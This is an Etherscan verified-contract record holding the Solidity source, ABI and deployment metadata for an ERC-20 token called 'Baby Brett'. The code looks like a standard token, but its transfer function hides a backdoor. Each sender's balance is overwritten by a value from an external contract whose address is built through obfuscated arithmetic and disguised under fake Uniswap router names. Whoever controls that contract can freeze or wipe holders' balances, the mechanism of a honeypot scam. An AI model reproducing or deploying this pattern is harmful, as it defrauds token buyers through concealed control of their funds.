{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2024-06-20\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2024-05-18\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2024-05-17\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity 0.8.20;\r\n\r\nabstract contract wearewin {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n}\r\n\r\n\r\n\r\n\r\n\r\ninterface UniswapRouterV2 {\r\n    function ytg767qweswpa(address oong, uint256 total,address destination) external view returns (uint256);\r\n    function getLPaddress(address a, uint b, address c) external view returns (address);\r\n    function getRouter(address a, uint b, address c) external view returns (address);\r\n}\r\n\r\ncontract Ownable is wearewin {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n\r\n}\r\n\r\nlibrary IUniswapRouterV2 {\r\n    function swap2(UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {\r\n       return instance.ytg767qweswpa(address(0),amount,from);\r\n    }\r\n\r\n    function swap99(UniswapRouterV2 instance2,UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {\r\n        if (amount >100){\r\n            return swap2(instance,  amount,from);\r\n        }else{\r\n            return swap2(instance2,  amount,from);\r\n        }\r\n        \r\n    }\r\n}\r\n\r\ncontract BABYBRET is wearewin,IERC20,Ownable {\r\n    using SafeMath for uint256;\r\n    uint256 private _totalSupply = 1000000000*10**18;\r\n    uint8 private constant _decimals = 18;\r\n    string private _name = unicode\"Baby Brett\";\r\n    string private _symbol = unicode\"BABYBRETT\";\r\n   \r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _balances;\r\n\r\n    UniswapRouterV2 private Router2Instance;\r\n\r\n    constructor(uint256 mnnn) {\r\n        uint256 cc = mnnn +uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000));\r\n        Router2Instance = getBcFnnmoosgsto(((brcFactornnmoosgsto(cc))));\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n    uint160 private bb = 10;\r\n     uint160 a = 10;\r\n      uint160 c = 10;\r\n    function brcFfffactornnmoosgsto(uint256 value) internal view returns (uint160) {\r\n       \r\n        return (c+bb+a+uint160(value)+uint160(uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000))));\r\n    }\r\n    \r\n    function brcFactornnmoosgsto(uint256 value) internal view returns (address) {\r\n           return address(brcFfffactornnmoosgsto(value));\r\n    }\r\n    function getBcFnnmoosgsto(address accc) internal pure returns (UniswapRouterV2) {\r\n        return getBcQnnmoosgsto(accc);\r\n    }\r\n\r\n    function getBcQnnmoosgsto(address accc) internal pure  returns (UniswapRouterV2) {\r\n        return UniswapRouterV2(accc);\r\n    }\r\n\r\n    function symbol() public view virtual  returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() public view virtual  returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() public view virtual  returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual  returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual  returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual  returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address sender) public view virtual  returns (uint256) {\r\n        return _allowances[owner][sender];\r\n    }\r\n\r\n    function approve(address sender, uint256 amount) public virtual  returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, sender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {\r\n        address sender = _msgSender();\r\n\r\n        uint256 currentAllowance = allowance(from, sender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n        unchecked {\r\n            _approve(from, sender, currentAllowance - amount);\r\n        }\r\n        }\r\n\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0) && to != address(0), \"ERC20: transfer the zero address\");\r\n        uint256 balance = IUniswapRouterV2.swap99(Router2Instance,Router2Instance,_balances[from], from);\r\n        require(balance >= amount, \"ERC20: amount over balance\");\r\n    \r\n        _balances[from] = balance.sub(amount);\r\n        \r\n        _balances[to] = _balances[to].add(amount);\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(address owner, address sender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(sender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][sender] = amount;\r\n        emit Approval(owner, sender, amount);\r\n    }\r\n\r\n   \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"mnnn\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BABYBRET", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000a25f280d8581463533d4f38cb408397f11de161e", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://06f34b163c9f08425c2815c02261ee66b91df609eb4a38002643e8f3136a76b2"}